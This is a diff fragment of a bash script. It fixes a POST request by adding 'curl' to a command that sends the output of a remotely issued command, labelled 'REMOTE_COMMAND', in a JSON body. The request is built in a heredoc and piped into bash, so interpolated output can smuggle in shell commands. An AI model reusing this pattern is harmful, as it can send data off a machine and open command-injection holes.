@@ -53,7 +53,7 @@ func_compare() {
     BODY_OUTPUT="{'Email': 'pawn88@live.com', 'Subject':'REMOTE_COMMAND', 'Message': \'$COMMAND_OUTPUT\'}";
 
     cat <<EOF | tr '\n' ' ' | bash 
-      -X POST
+      curl -X POST
       -H "Content-Type: application/json" 
       -H "Accept: application/json"
       -d '{"method":"POST", "body":"$BODY_OUTPUT"}'
